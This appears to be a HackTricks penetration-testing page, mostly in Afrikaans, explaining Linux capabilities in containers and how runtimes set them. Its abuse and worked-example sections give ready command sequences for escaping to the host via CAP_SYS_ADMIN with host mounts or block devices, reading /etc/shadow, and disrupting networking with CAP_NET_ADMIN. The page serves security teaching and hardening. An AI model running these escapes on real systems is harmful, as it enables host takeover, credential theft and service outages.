# Linux-magte in Houers

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

Linux-magte is een van die belangrikste dele van houer-sekuriteit omdat hulle ’n subtiele maar fundamentele vraag beantwoord: **wat beteken "root" regtig binne ’n houer?** Op ’n normale Linux-stelsel het UID 0 histories ’n baie wye stel voorregte geïmpliseer. In moderne kernels is daardie voorreg opgebreek in kleiner eenhede wat capabilities genoem word. ’n Proses kan as root loop en steeds baie kragtige operasies mis as die relevante magte verwyder is.

Houers leun sterk op hierdie onderskeid. Baie workloads word steeds as UID 0 binne die houer begin vir versoenbaarheid of eenvoud. Sonder die verwydering van magte sou dit te gevaarlik wees. Met die verwydering van magte kan ’n houer-root-proses steeds baie gewone in-houer take uitvoer terwyl dit weier word vir meer sensitiewe kernel-operasies. Daarom beteken ’n houer-skulp wat sê `uid=0(root)` nie outomaties "host root" of selfs "wye kernel-voorregte" nie. Die capability-stelle bepaal hoeveel daardie root-identiteit werklik werd is.

For the full Linux capability reference and many abuse examples, see:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Werking

Capabilities word in verskeie stelle gevolg, insluitend the permitted, effective, inheritable, ambient, and bounding sets. Vir baie houer-assesserings is die presiese kernel-semantiek van elke stel minder onmiddellik belangrik as die finale praktiese vraag: **watter geprivilegieerde operasies kan hierdie proses nou suksesvol uitvoer, en watter toekomstige voorregtoenames is nog moontlik?**

Die rede waarom dit saak maak, is dat baie breakout techniques eintlik capability-probleme vermom as container-probleme is. ’n Workload met `CAP_SYS_ADMIN` kan toegang tot baie kernel-funksionaliteit kry wat ’n normale houer-root-proses nie behoort te raak nie. ’n Workload met `CAP_NET_ADMIN` word baie gevaarliker as dit ook die host network namespace deel. ’n Workload met `CAP_SYS_PTRACE` word baie meer interessant as dit host-prosesse kan sien deur host PID sharing. In Docker of Podman kan dit as `--pid=host` verskyn; in Kubernetes verskyn dit gewoonlik as `hostPID: true`.

Met ander woorde, die capability-stel kan nie in isolasie geëvalueer word nie. Dit moet saam gelees word met namespaces, seccomp, and MAC policy.

## Lab

’n Baie direkte manier om magte binne ’n houer te inspekteer, is:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Jy kan ook 'n meer beperkende container vergelyk met een wat alle capabilities bygevoeg het:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Om die effek van 'n noue toevoeging te sien, probeer om alles te verwyder en slegs een capability terug te voeg:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Hierdie klein eksperimente help wys dat 'n runtime nie bloot 'n boolean genaamd "privileged" omskakel nie. Dit vorm die werklike voorreg-oppervlak wat vir die proses beskikbaar is.

## Hoë-risiko capabilities

Alhoewel baie capabilities van belang kan wees, afhangend van die teiken, is 'n paar herhaaldelik relevant in container-ontsnappingsanalise.

**`CAP_SYS_ADMIN`** is die een wat verdedigers met die meeste agterdog moet hanteer. Dit word dikwels beskryf as "the new root" omdat dit 'n enorme hoeveelheid funksionaliteit ontsluit, insluitend mount-verwante operasies, namespace-gevoelige gedrag, en baie kernel-paaie wat nooit sommer aan containers blootgestel behoort te word nie. As 'n container `CAP_SYS_ADMIN`, swak seccomp, en geen sterk MAC-konfinering het nie, word baie klassieke breakout-paaie baie meer realisties.

**`CAP_SYS_PTRACE`** maak saak wanneer proses-waarneembaarheid bestaan, veral as die PID namespace met die host of met interessante naburige workloads gedeel word. Dit kan sigbaarheid in inmenging omskakel.

**`CAP_NET_ADMIN`** en **`CAP_NET_RAW`** is belangrik in netwerk-gefokusde omgewings. Op 'n geïsoleerde bridge-netwerk kan hulle reeds riskant wees; op 'n gedeelde host network namespace is hulle baie erger omdat die workload dalk die host-netwerk kan herkonfigureer, sniff, spoof, of kan inmeng met plaaslike verkeersvloei.

**`CAP_SYS_MODULE`** is gewoonlik katastrofies in 'n rootful-omgewing omdat die laai van kernel-modules effektief beheer oor die host-kern beteken. Dit behoort byna nooit in 'n algemene doel container-workload voor te kom nie.

## Runtime Gebruik

Docker, Podman, containerd-based stacks, en CRI-O gebruik almal capability-beheer, maar die verstekinstellings en bestuurskoppelvlakke verskil. Docker openbaar dit baie direk deur vlagte soos `--cap-drop` en `--cap-add`. Podman bied soortgelyke beheer en baat dikwels by rootless-uitvoering as 'n aanvullende veiligheidslaag. Kubernetes toon capability-byvoegings en -verwyderings deur die Pod of container `securityContext`. Stelsel-container omgewings soos LXC/Incus vertrou ook op capability-beheer, maar die breër host-integrasie van daardie stelsels versoek operateurs dikwels om verstekwaardes meer aggressief te verslap as wat hulle in 'n app-container-omgewing sou doen.

Dieselfde beginsel geld oor al hulle: 'n capability wat tegnies moontlik is om toe te ken, is nie noodwendig een wat toegeken behoort te word nie. Baie werklike voorvalle begin wanneer 'n operateur 'n capability byvoeg bloot omdat 'n workload onder 'n strengere konfigurasie misluk het en die span 'n vinnige oplossing benodig het.

## Miskonfigurasies

Die mees voor die hand liggende fout is **`--cap-add=ALL`** in Docker/Podman-styl CLIs, maar dit is nie die enigste nie. In die praktyk is 'n meer algemene probleem om een of twee uiters kragtige capabilities toe te ken, veral `CAP_SYS_ADMIN`, om die toepassing "te laat werk" sonder om ook die namespace-, seccomp- en mount-implikasies te verstaan. 'n Ander algemene faalmodus is om ekstra capabilities te kombineer met gedeelde host-namespaces. In Docker of Podman kan dit verskyn as `--pid=host`, `--network=host`, of `--userns=host`; in Kubernetes verskyn die ekwivalente blootstelling gewoonlik deur workload-instellings soos `hostPID: true` of `hostNetwork: true`. Elk van daardie kombinasies verander wat die capability eintlik kan beïnvloed.

Dit is ook algemeen om administrateurs te sien glo dat omdat 'n workload nie volledig `--privileged` is nie, dit steeds betekenisvol gekonstrafeer is. Soms is dit waar, maar soms is die effektiewe houding reeds proximities genoeg aan privileged dat die onderskeid operasioneel ophou om saak te maak.

## Misbruik

Die eerste praktiese stap is om die effektiewe capability-stel te enummer en onmiddellik die capability-spesifieke aksies te toets wat van belang sou wees vir ontsnapping of toegang tot host-inligting:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
As `CAP_SYS_ADMIN` teenwoordig is, toets eers mount-gebaseerde misbruik en toegang tot die host-lêerstelsel, want dit is een van die mees algemene breakout-enablers:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Indien `CAP_SYS_PTRACE` teenwoordig is en die container interessante prosesse kan sien, verifieer of die bevoegdheid in prosesinspeksie omgeskakel kan word:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
As `CAP_NET_ADMIN` of `CAP_NET_RAW` teenwoordig is, toets of die werklading die sigbare netwerkstapel kan manipuleer of ten minste nuttige netwerkintelligensie kan insamel:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Wanneer 'n capability-toets slaag, kombineer dit met die namespace-situasie. ’n capability wat slegs riskant lyk in ’n geïsoleerde namespace kan onmiddellik ’n escape- of host-recon-primitive word wanneer die container ook host PID, host network, of host mounts deel.

### Volledige Voorbeeld: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Indien die container `CAP_SYS_ADMIN` het en 'n writable bind mount van die host filesystem, soos `/host`, is die escape path dikwels reguit:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
As `chroot` slaag, word opdragte nou in die host root-lêerstelsel-konteks uitgevoer:
```bash
id
hostname
cat /etc/shadow | head
```
As `chroot` nie beskikbaar is nie, kan dieselfde resultaat dikwels bereik word deur die binary via die gemonteerde gidsboom aan te roep:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Volledige voorbeeld: `CAP_SYS_ADMIN` + Device Access

As 'n block device van die host blootgestel word, kan `CAP_SYS_ADMIN` dit omskep in direkte toegang tot die host se filesystem:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Volledige Voorbeeld: `CAP_NET_ADMIN` + Host Networking

Hierdie kombinasie produseer nie altyd direk host root nie, maar dit kan die host network stack volledig herkonfigureer:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Dit kan denial of service, traffic interception, of toegang tot dienste wat voorheen gefiltreer was, moontlik maak.

## Kontroles

Die doel van die capability-kontroles is nie net om rou waardes uit te haal nie, maar om te bepaal of die proses genoeg voorregte het om sy huidige namespace- en mount-situasie gevaarlik te maak.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Wat interessant is:

- `capsh --print` is die maklikste manier om hoë-risiko capabilities soos `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, of `cap_sys_module` op te spoor.
- Die `CapEff`-reël in `/proc/self/status` wys wat op die oomblik effektief is, nie net wat in ander stelle beskikbaar kan wees nie.
- 'n capability dump word veel belangriker as die container ook gasheer PID-, netwerk- of user namespaces deel, of skryfbare gasheer-mounts het.

Na die insameling van die rou capability-inligting is die volgende stap interpretasie. Vra of die proses root is, of user namespaces geaktiveer is, of host namespaces gedeel word, of seccomp afdwing, en of AppArmor of SELinux steeds die proses beperk. 'n capability-set op sigself is net 'n deel van die verhaal, maar dit is dikwels die deel wat verduidelik waarom een container breakout werk en 'n ander misluk met dieselfde ogenskynlike beginpunt.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Verminderde capability-set per verstek | Docker hou 'n verstek-toegangslys (allowlist) van capabilities en verwyder die res | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Verminderde capability-set per verstek | Podman containers is per verstek unprivileged en gebruik 'n verminderde capability-model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Erf runtime-verstekke tensy verander | As geen `securityContext.capabilities` gespesifiseer is nie, kry die container die verstek capability-set van die runtime | `securityContext.capabilities.add`, nie om `drop: [\"ALL\"]` te doen nie, `privileged: true` |
| containerd / CRI-O under Kubernetes | Gewoonlik runtime-verstek | Die effektiewe stel hang af van die runtime plus die Pod-spec | soos in die Kubernetes-ry; direkte OCI/CRI-konfigurasie kan ook capabilities eksplisiet byvoeg |

Vir Kubernetes is die belangrike punt dat die API nie een universele verstek capability-set definieer nie. As die Pod nie capabilities byvoeg of verwyder nie, erf die werklas die runtime-verstek vir daardie node.
{{#include ../../../../banners/hacktricks-training.md}}
